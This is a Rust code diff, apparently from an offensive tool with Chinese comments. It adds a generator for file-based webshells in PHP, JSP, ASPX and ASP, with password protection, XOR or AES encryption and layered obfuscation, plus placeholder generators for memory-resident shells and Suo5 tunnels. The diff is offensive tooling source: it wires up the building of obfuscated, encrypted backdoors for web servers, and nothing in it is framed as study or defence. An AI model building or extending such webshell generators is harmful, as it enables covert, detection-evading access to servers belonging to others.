@@ -29,7 +29,75 @@ impl GeneratorFactory {
         match mode {
             PayloadMode::Simple => Box::new(SimpleGenerator),
             PayloadMode::Advanced => Box::new(AdvancedGenerator),
+            PayloadMode::FileBased => Box::new(FileBasedGenerator),
+            PayloadMode::MemoryShell => Box::new(MemoryShellGenerator),
+            PayloadMode::Suo5Only => Box::new(Suo5OnlyGenerator),
         }
+    }
+}
+
+/// 文件型 WebShell 生成器 - Phase 1
+pub struct FileBasedGenerator;
+
+impl PayloadGenerator for FileBasedGenerator {
+    fn generate(&self, config: &PayloadConfig) -> Result<String> {
+        use crate::core::file_shell::{self, FileShellConfig};
+        use crate::core::obfuscator::{ScriptLanguage, ObfuscationLevel};
+        use crate::core::crypto::EncryptionType;
+
+        let language = match config.script_type {
+            crate::types::payload::ScriptType::Php => ScriptLanguage::PHP,
+            crate::types::payload::ScriptType::Jsp => ScriptLanguage::JSP,
+            crate::types::payload::ScriptType::Aspx => ScriptLanguage::ASPX,
+            crate::types::payload::ScriptType::Asp => ScriptLanguage::ASP,
+        };
+
+        let encryption = match config.encrypt_algo {
+            Some(crate::types::payload::EncryptAlgo::Xor) => EncryptionType::XOR,
+            Some(_) => EncryptionType::AES256GCM,
+            None => EncryptionType::None,
+        };
+
+        let obfuscation = match config.obfuscation_level {
+            crate::types::payload::ObfuscationLevel::Low => ObfuscationLevel::L1,
+            crate::types::payload::ObfuscationLevel::Medium => ObfuscationLevel::L2,
+            crate::types::payload::ObfuscationLevel::High => ObfuscationLevel::L3,
+        };
+
+        let asp_ascii = matches!(config.script_type, crate::types::payload::ScriptType::Asp);
+
+        let file_config = FileShellConfig {
+            language,
+            encryption,
+            password: config.password.clone(),
+            obfuscation,
+            asp_ascii,
+        };
+
+        file_shell::generate_file_shell(&file_config)
+            .map_err(|e| crate::types::payload::GeneratorError::GenerationFailed(e))
+    }
+}
+
+/// 内存马生成器 - Phase 2 (占位)
+pub struct MemoryShellGenerator;
+
+impl PayloadGenerator for MemoryShellGenerator {
+    fn generate(&self, _config: &PayloadConfig) -> Result<String> {
+        Err(crate::types::payload::GeneratorError::GenerationFailed(
+            "Memory Shell generation is not implemented in Phase 1".to_string()
+        ))
+    }
+}
+
+/// Suo5 专用生成器 - Phase 3 (占位)
+pub struct Suo5OnlyGenerator;
+
+impl PayloadGenerator for Suo5OnlyGenerator {
+    fn generate(&self, _config: &PayloadConfig) -> Result<String> {
+        Err(crate::types::payload::GeneratorError::GenerationFailed(
+            "Suo5 generation is not implemented in Phase 1".to_string()
+        ))
     }
 }
 
@@ -45,7 +113,7 @@ impl PayloadGenerator for SimpleGenerator {
         )?;
         
         // 应用混淆
-        let obfuscated = self.apply_obfuscation(base_code, &config.obfuscation_level);
+        let obfuscated = self.apply_obfuscation(base_code, &config.script_type, &config.obfuscation_level);
         
         // 应用编码
         match &config.encode_type {
@@ -231,15 +299,29 @@ End If"#, password)),
     }
 
     /// 应用混淆
-    fn apply_obfuscation(&self, code: String, level: &ObfuscationLevel) -> String {
-        match level {
-            ObfuscationLevel::Low => self.low_obfuscation(code),
-            ObfuscationLevel::Medium => self.medium_obfuscation(code),
-            ObfuscationLevel::High => self.high_obfuscation(code),
-        }
+    fn apply_obfuscation(&self, code: String, script_type: &ScriptType, level: &ObfuscationLevel) -> String {
+        use crate::core::obfuscator::{Obfuscator, ObfuscationLevel as OLevel, ScriptLanguage};
+        let mut result = code;
+        
+        let script_lang = match script_type {
+            ScriptType::Php => ScriptLanguage::PHP,
+            ScriptType::Jsp => ScriptLanguage::JSP,
+            ScriptType::Aspx => ScriptLanguage::ASPX,
+            ScriptType::Asp => ScriptLanguage::ASP,
+        };
+        
+        let o_level = match level {
+            ObfuscationLevel::Low => OLevel::L1,
+            ObfuscationLevel::Medium => OLevel::L2,
+            ObfuscationLevel::High => OLevel::L3,
+        };
+        
+        result = Obfuscator::obfuscate(&result, script_lang, o_level);
+        
+        result
     }
 
-    /// 低级混淆 - 变量名随机化
+    /// 低级混淆 - 变量名随机化 (保留向后兼容)
     fn low_obfuscation(&self, code: String) -> String {
         let mut rng = rand::thread_rng();
         let var_name: String = (0..6)
@@ -249,22 +331,17 @@ End If"#, password)),
             })
             .collect();
         
-        // 简单的变量替换 (示例)
         code.replace("$cmd", &format!("${}", var_name))
     }
 
-    /// 中级混淆 - 字符串拆分 + 变量随机化
+    /// 中级混淆 - 字符串拆分 + 变量随机化 (保留向后兼容)
     fn medium_obfuscation(&self, code: String) -> String {
-        let obfuscated = self.low_obfuscation(code);
-        // 添加更多混淆逻辑
-        obfuscated
+        self.low_obfuscation(code)
     }
 
-    /// 高级混淆 - 多层编码 + 垃圾代码
+    /// 高级混淆 - 多层编码 + 垃圾代码 (保留向后兼容)
     fn high_obfuscation(&self, code: String) -> String {
-        let obfuscated = self.medium_obfuscation(code);
-        // 添加垃圾代码和更复杂的混淆
-        obfuscated
+        self.medium_obfuscation(code)
     }
 
     /// Base64 编码
